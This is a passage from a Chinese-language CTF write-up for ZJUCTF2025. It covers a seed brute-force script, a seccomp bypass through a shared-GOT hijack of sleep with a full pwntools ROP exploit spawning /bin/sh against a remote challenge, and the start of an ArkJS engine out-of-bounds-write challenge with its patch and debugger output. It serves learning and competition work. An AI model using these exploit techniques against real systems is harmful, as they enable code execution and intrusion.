class="built_in">print</span>(<span class="string">f"警告: 发现非法字符 '<span class="subst">{char}</span>' (位置 <span class="subst">{i}</span>)。跳过该字符。"</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 记录有效指令</span></span><br><span class="line">        valid_instructions.append(char)</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 1. 移位并合并：将当前 byte 向左移动 2 位，然后合并新代码</span></span><br><span class="line">        <span class="comment"># 实现 MSB 优先 (高位先写入) 的打包</span></span><br><span class="line">        current_byte = (current_byte &lt;&lt; <span class="number">2</span>) | code</span><br><span class="line">        bit_count += <span class="number">2</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 2. 检查是否填满一个完整的字节 (8 位)</span></span><br><span class="line">        <span class="keyword">if</span> bit_count == <span class="number">8</span>:</span><br><span class="line">            encoded_bytes.append(current_byte)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 重置用于下一个字节的编码</span></span><br><span class="line">            current_byte = <span class="number">0</span></span><br><span class="line">            bit_count = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># --- 2. 处理剩余未满 8 位的指令 (如果存在) ---</span></span><br><span class="line">    <span class="keyword">if</span> bit_count &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 将剩余的 bits 左移，使其对齐到字节的高位 (MSB) </span></span><br><span class="line">        <span class="comment"># 低位 (LSB) 用 0 填充</span></span><br><span class="line">        current_byte &lt;&lt;= (<span class="number">8</span> - bit_count)</span><br><span class="line">        encoded_bytes.append(current_byte)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># --- 3. 日志阶段：按字节和按 4 字节的行打印 ---</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"\n--- WASD Bytecode Encoding Log ---"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 每个字节包含 4 个指令</span></span><br><span class="line">    INSTRUCTIONS_PER_BYTE = <span class="number">4</span></span><br><span class="line">    </span><br><span class="line">    num_bytes = <span class="built_in">len</span>(encoded_bytes)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_bytes):</span><br><span class="line">        byte_val = encoded_bytes[i]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 计算当前字节对应的指令在有效指令列表中的起始和结束索引</span></span><br><span class="line">        start_instr_index = i * INSTRUCTIONS_PER_BYTE</span><br><span class="line">        end_instr_index = start_instr_index + INSTRUCTIONS_PER_BYTE</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 截取已编码的指令序列</span></span><br><span class="line">        instr_segment = <span class="string">""</span>.join(valid_instructions[start_instr_index:end_instr_index])</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 如果是最后一个字节且不满 4 个指令，使用 '?' 填充到 4 位 (匹配原解码器日志)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(instr_segment) &lt; INSTRUCTIONS_PER_BYTE:</span><br><span class="line">            padding_count = INSTRUCTIONS_PER_BYTE - <span class="built_in">len</span>(instr_segment)</span><br><span class="line">            instr_segment += <span class="string">'?'</span> * padding_count</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 格式化输出 (字节值和指令)</span></span><br><span class="line">        byte_log = <span class="string">f"Byte <span class="subst">{i:02d}</span> (<span class="subst">{byte_val:02X}</span>h): <span class="subst">{instr_segment:&lt;<span class="number">4</span>}</span>"</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打印：每 4 个字节打印一行</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 打印当前字节的日志，使用空格分隔</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"<span class="subst">{byte_log}</span>    "</span>, end=<span class="string">""</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 打印日志结束后的换行符</span></span><br><span class="line">    <span class="keyword">if</span> num_bytes &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"----------------------------------"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># --- 4. 返回最终编码结果 ---</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(encoded_bytes)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./vuln"</span>)</span><br><span class="line"><span class="comment"># p = websocket("wss://ctf.zjusec.com/api/proxy/406eb029-711c-441d-a096-be4643125880")</span></span><br><span class="line">min_default = <span class="number">13</span></span><br><span class="line">min_seed = <span class="number">1866723839</span> <span class="comment"># 609408837 351793580</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_maze</span>():</span><br><span class="line">    <span class="keyword">global</span> min_default, min_seed</span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    seed = random.randint(<span class="number">0</span>, <span class="number">0x7fffffff</span>)</span><br><span class="line">    sla(<span class="string">b"Enter seed:"</span>, <span class="built_in">str</span>(seed))</span><br><span class="line">    response = p.recvuntil(<span class="string">b"Enter move (w/a/s/d):"</span>)</span><br><span class="line">    default_num = response.count(<span class="string">b"#"</span>)</span><br><span class="line">    <span class="built_in">print</span>(default_num)</span><br><span class="line">    <span class="keyword">if</span> default_num &lt;= min_default:</span><br><span class="line">        min_default = default_num</span><br><span class="line">        min_seed = seed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- WASD Bytecode Log ---</span></span><br><span class="line"><span class="comment"># Byte 00 (66h): dsds    Byte 01 (81h): swwd    Byte 02 (E9h): assd    Byte 03 (17h): wdda</span></span><br><span class="line"><span class="comment"># Byte 04 (05h): wwdd</span></span><br><span class="line"><span class="comment"># -------------------------</span></span><br><span class="line"><span class="comment"># --- WASD Bytecode Log ---</span></span><br><span class="line"><span class="comment"># Byte 00 (66h): dsds    Byte 01 (81h): swwd    Byte 02 (EBh): assa    Byte 03 (17h): wdda</span></span><br><span class="line"><span class="comment"># Byte 04 (05h): wwdd</span></span><br><span class="line"><span class="comment"># -------------------------</span></span><br><span class="line"><span class="comment"># print(wasd)</span></span><br><span class="line">wasd = <span class="string">"dwwwddsaaaswddswaaswddswdwswdsdsswwdassawddawwddaaswaaswddwadwswawwa"</span></span><br><span class="line">wasd += <span class="string">"dddd"</span></span><br><span class="line">sla(<span class="string">b"Enter seed:"</span>, <span class="built_in">str</span>(min_seed))</span><br><span class="line">gdb.attach(p, <span class="string">"brva 0x17C6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> wasd:</span><br><span class="line">    sla(<span class="string">b"Enter move (w/a/s/d):"</span>, i)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251126154510272.png"></p>
<p>flag: <code>ZJUCTF{5eem5_you_@re_1ucky_enou9h!LF$R_i5_vu1n@r@61e}</code></p>
<h3 id="safe">9 safe</h3>
<p>简单的多线程，看一下程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">__uid_t</span> euid; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">__uid_t</span> ruid; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">pthread_t</span> newthread[<span class="number">7</span>]; <span class="comment">// [esp+0h] [ebp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  newthread[<span class="number">4</span>] = (<span class="type">pthread_t</span>)&amp;argc;</span><br><span class="line">  euid = geteuid();</span><br><span class="line">  ruid = geteuid();</span><br><span class="line">  setreuid(ruid, euid);</span><br><span class="line">  alarm(<span class="number">0xA</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  pthread_create(newthread, <span class="number">0</span>, (<span class="type">void</span> *(*)(<span class="type">void</span> *))safe_code, <span class="number">0</span>);</span><br><span class="line">  unsafe_code();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    ;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>程序主函数会生成一个线程去执行safe_code，程序主线程执行unsafe_code。safe_code中是一个死循环</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">safe_code</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"In the sandbox..."</span>);</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><code>unsafe_code</code>有一个栈溢出但是会加沙箱：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">unsafe_code</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  _BYTE buf[<span class="number">1028</span>]; <span class="comment">// [esp+0h] [ebp-408h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setup_rules();</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x800</span>u);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@LAPTOP-<span class="number">1</span>THOKMAC:/home/wingee/ZJUCTF2025/safe# seccomp-tools dump ./safe</span><br><span class="line">In the sandbox...</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000004</span>  <span class="keyword">A</span> = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15 0x00</span> <span class="number">0</span>x06 <span class="number">0x40000003</span>  if (<span class="keyword">A</span> != ARCH_I386) goto <span class="number">0008</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000000</span>  <span class="keyword">A</span> = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15 0x03</span> <span class="number">0</span>x00 <span class="number">0x00000001</span>  if (<span class="keyword">A</span> == exit) goto <span class="number">0007</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15 0x02</span> <span class="number">0</span>x00 <span class="number">0x00000003</span>  if (<span class="keyword">A</span> == read) goto <span class="number">0007</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15 0x01</span> <span class="number">0</span>x00 <span class="number">0x00000004</span>  if (<span class="keyword">A</span> == write) goto <span class="number">0007</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15 0x00</span> <span class="number">0</span>x01 <span class="number">0</span>x000000ad  if (<span class="keyword">A</span> != rt_sigreturn) goto <span class="number">0008</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06 0x00</span> <span class="number">0</span>x00 <span class="number">0</span>x7fff0000  return ALLOW</span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x06 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000000</span>  return KILL</span><br></pre></td></tr></table></figure>
<p>可以执行<code>exit</code> <code>read</code> <code>write</code>, 其他都不行，看了下程序没有开pie并且是32位，<code>unsafe</code>里面还是一直在循环的，并且<code>pertial relro</code></p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root<span class="keyword">@LAPTOP-</span><span class="number">1</span><span class="attribute">THOKMAC</span>:/home/wingee/ZJUCTF2025/safe# checksec safe</span><br><span class="line">[*] <span class="string">'/home/wingee/ZJUCTF2025/safe/safe'</span></span><br><span class="line">    <span class="attribute">Arch</span>:     i386-<span class="number">32</span>-little</span><br><span class="line">    <span class="attribute">RELRO</span>:    Partial RELRO</span><br><span class="line">    <span class="attribute">Stack</span>:    No canary found</span><br><span class="line">    <span class="attribute">NX</span>:       NX enabled</span><br><span class="line">    <span class="attribute">PIE</span>:      No PIE (<span class="number">0</span>x8042000)</span><br></pre></td></tr></table></figure>
<p>所以思路很明确，由于线程与线程之间共享很多东西，包括<code>GOT</code>，所以我们可以使用主线程去劫持<code>sleep</code>的<code>GOT</code>到<code>unsafe_code</code>（跳过开沙箱的代码），之后子线程运行<code>sleep</code>的时候就会到<code>unsafe_code</code>，之后我们打一个常规的泄露<code>GOT</code>中函数指针进而泄露<code>libc</code>，布置<code>rop</code>链子运行<code>system("/bin/sh")</code>就行了。</p>
<p>32位程序甚至不需要找<code>gadget</code>，很简单了，本题<code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">p = websocket(<span class="string">"wss://ctf.zjusec.com/api/proxy/425979c0-f9e5-41a2-9c8a-929011b038d2"</span>)  <span class="comment"># 0xf7c90000</span></span><br><span class="line"><span class="comment"># p = process("./safe")</span></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/lib/i386-linux-gnu/libc.so.6")</span></span><br><span class="line">elf = ELF(<span class="string">"./safe"</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x0804880C</span>) * (<span class="number">0x408</span> // <span class="number">4</span>)</span><br><span class="line">payload += p32(<span class="number">0x0804880C</span>)</span><br><span class="line">payload += p32(elf.sym[<span class="string">"read"</span>])</span><br><span class="line">payload += p32(<span class="number">0x080488E9</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(elf.got[<span class="string">"sleep"</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment"># sleep(0.5)</span></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x0804880C</span>)</span><br><span class="line"></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x3d2a3</span>, <span class="number">0x3d2a5</span>, <span class="number">0x3d2b0</span>]</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  ECX  0xf7d0df50</span></span><br><span class="line"><span class="comment">#  EBP  0xf7d0e358 —▸ 0xf7d0e428 ◂— 0</span></span><br><span class="line"><span class="comment">#  ESP  0xf7d0e32c —▸ 0x804881f (unsafe_code+48) ◂— add esp, 0x10</span></span><br><span class="line"><span class="comment">#  0xf7d2c308</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = p32(<span class="number">0x804A800</span>) * ((<span class="number">0xe308</span> - <span class="number">0xdf50</span>) // <span class="number">4</span> )</span><br><span class="line">payload += p32(<span class="number">0x804A800</span>)</span><br><span class="line"><span class="comment"># payload += p32(0x0804880C)</span></span><br><span class="line">payload += p32(elf.plt[<span class="string">"puts"</span>])</span><br><span class="line">payload += p32(<span class="number">0x0804880C</span>)</span><br><span class="line"><span class="comment"># payload += p32(0)</span></span><br><span class="line">payload += p32(elf.got[<span class="string">"puts"</span>])</span><br><span class="line"><span class="comment"># payload += p32(4)</span></span><br><span class="line">payload += p32(<span class="number">0x080488E9</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">p.recvuntil(<span class="string">b"In the sandbox...\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"In the sandbox...\n"</span>)</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - (<span class="number">0xf7d9cd90</span> - <span class="number">0xf7d35000</span>)</span><br><span class="line">success(<span class="string">f"libc_base =&gt; <span class="subst">{<span class="built_in">hex</span>(libc_base)}</span>"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">one_gadget = libc_base + one_gadget[<span class="number">0</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"/bin/sh\x00"</span></span><br><span class="line">payload += p32(<span class="number">0x804A800</span>) * (<span class="number">0x408</span> // <span class="number">4</span> - <span class="number">2</span>)</span><br><span class="line">payload += p32(<span class="number">0x804A800</span>)</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(<span class="number">0x080488E9</span>)</span><br><span class="line">payload += p32(<span class="number">0x804A800</span> - <span class="number">0x408</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251126155707744.png"></p>
<p>flag: <code>flag{R3t_t0_Th3_Uns4fe_Thr3ad_nk_$$Xyv#*}</code></p>
<h3 id="oh_arkpwn2025">10 oh_arkpwn2025</h3>
<p>牢完了，幸好之前复现过<code>arkjs</code>的题目，有一些套路性脚本直接拿来用了，不然真就牢完了。</p>
<p>但是还是花了好长时间重温华子方舟引擎字节码处理的内存布局，主要就是数组对象在内存的布局</p>
<p>方舟JS运行时使用的是<code>ark_runtime_core</code>的一套公共组件，包括执行字节码的相关逻辑：</p>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251126160707730.png"></p>
<p>然后翻到了一个手册，这个手册讲的还是很好的，有一些名词wp里写的不是很清楚的这个手册里都可以找到，最关键的是如何通过<code>SemiSpace</code>的地址加任意地址读泄露<code>heap</code>地址的阶段，其实比较复杂，但做完之后看了眼手册里讲的还是很明白的。</p>
<p>https://developer.huawei.com/consumer/cn/doc/best-practices/bpta-arkts-js-memory-analysis</p>
<p>在<code>Arkjs</code>中，我们分配的数组会存储在一个叫做<code>SemiSpace</code>的小区段地址空间，在当前方舟JS运行时版本下，分配的小数组的地址会很低，<code>native</code>地址差非常非常多，还有一种内存叫做<code>native</code>内存，这里的内存就是原本使用<code>malloc</code> <code>new</code>等函数分配的堆块所在的地方。</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本文<span class="keyword">Native</span>内存指的主要是代码中通过malloc、<span class="keyword">new</span>、realloc、calloc函数申请的堆内存和通过mmap映射内存地址空间，<span class="keyword">Native</span>内存是进程内存中占比较高，也是容易出泄漏问题的一种内存。分析<span class="keyword">Native</span>内存分布与占用问题需要借助工具，以及一些测试，分析技巧。DevEco Studio Profiler插件的Allocation模板，通过对基础库的malloc，free等函数进行插桩记录，可以抓取<span class="keyword">Native</span>内存分配释放记录，包括大小和堆栈等数据，用以分析<span class="keyword">native</span>内存的占用问题。</span><br></pre></td></tr></table></figure>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251126160927613.png"></p>
<p>感觉和<code>v8</code>的逻辑差不太多，先来看下题目吧。题目给出了一个针对<code>arkcompiler_ets_runtime</code>的<code>patch</code>，主要做了这几件事：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">+JSTaggedValue <span class="title function_">BuiltinsArkTools::OOB</span><span class="params">(EcmaRuntimeCallInfo *info)</span></span><br><span class="line">+{</span><br><span class="line">+    ASSERT(info);</span><br><span class="line">+    JSThread *thread = info-&gt;GetThread();</span><br><span class="line">+    [[maybe_unused]] EcmaHandleScope <span class="title function_">handleScope</span><span class="params">(thread)</span>;</span><br><span class="line">+</span><br><span class="line">+    ASSERT(info-&gt;GetArgsNumber() == <span class="number">3</span>);</span><br><span class="line">+</span><br><span class="line">+    JSHandle&lt;JSTypedArray&gt; typedArrayHandle = JSHandle&lt;JSTypedArray&gt;::Cast(GetCallArg(info, <span class="number">0</span>));</span><br><span class="line">+    <span class="type">uint32_t</span> index = GetCallArg(info, <span class="number">1</span>)-&gt;GetInt();</span><br><span class="line">+    JSHandle&lt;JSTaggedValue&gt; valueHandle = GetCallArg(info, <span class="number">2</span>);</span><br><span class="line">+</span><br><span class="line">+    <span class="type">uintptr_t</span> buf = ToUintPtr(ByteArray::Cast(typedArrayHandle-&gt;GetViewedArrayBufferOrByteArray(thread).GetTaggedObject())-&gt;GetData());</span><br><span class="line">+</span><br><span class="line">+    *(<span class="type">uint32_t</span> *)(buf + index) = valueHandle.GetTaggedValue().GetInt();</span><br><span class="line">+    </span><br><span class="line">+    <span class="keyword">return</span> JSTaggedValue::True();</span><br><span class="line">+}</span><br></pre></td></tr></table></figure>
<p>给出一个<code>OOB</code>的函数结构，这个函数接口注册在<code>BuiltinsArkTools</code>中，我们可以通过<code>Arktools.oob(...)</code>来调用，该代码明确的调用规范应该是这样，第一参数是一个数组，第二个参数是下标，第三个参数的要写入的数，漏洞点在倒数第三行，在对数组进行写入的时候没有校验下标是否合法，即小于数组本身的<code>size</code>，<strong>这就会造成任意数组高地址的越界写</strong>。</p>
<p>之后，这个<code>patch</code>将一个原本可读可执行的代码段注册成了可读可写可执行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@@ <span class="number">-157</span>,<span class="number">7</span> +<span class="number">157</span>,<span class="number">7</span> @@ <span class="type">bool</span> <span class="title function_">StubFileInfo::Load</span><span class="params">()</span></span><br><span class="line">         }</span><br><span class="line">     }</span><br><span class="line">     <span class="title function_">LOG_COMPILER</span><span class="params">(INFO)</span> &lt;&lt; "loaded stub file successfully";</span><br><span class="line">-    <span class="keyword">if</span> (!PageProtect(stubsMem_.addr_, stubsMem_.size_, PAGE_PROT_EXEC_READ)) {</span><br><span class="line">+    <span class="keyword">if</span> (!PageProtect(stubsMem_.addr_, stubsMem_.size_, PAGE_PROT_EXEC_READWRITE)) {</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">     }</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<p>我们可以向其中填充<code>shellcode</code>。</p>
<p>先调试一下，看一下我们分配的小数组堆块在内存中的布局：</p>
<blockquote>
<p>附件给出了一个编译好的<code>ark_js_vm</code>和一个<code>es2abc</code>，我们首先要把js文件用<code>es2abc</code>编译成<code>abc</code>文件，再让<code>ark_js_vm</code>去执行</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">let</span> oob1 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">let</span> oob3 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">0x800</span>);</span><br><span class="line"><span class="keyword">let</span> oob2 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">0x800</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele  <span class="number">0x243ffff430</span> <span class="number">70</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ <span class="built_in">r8</span> <span class="number">0x243ffff430</span> —▸ <span class="number">0x18fffcba60</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│    <span class="number">0x243ffff438</span> ◂— <span class="number">0xffff000000000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│    <span class="number">0x243ffff440</span> —▸ <span class="number">0x18fff83508</span> —▸ <span class="number">0x18fff81128</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│    <span class="number">0x243ffff448</span> —▸ <span class="number">0x18fff83508</span> —▸ <span class="number">0x18fff81128</span> —▸ <span class="number">0x18fff810d0</span> ◂— <span class="number">0x18fff810d0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│    <span class="number">0x243ffff450</span> —▸ <span class="number">0x243ffff490</span> —▸ <span 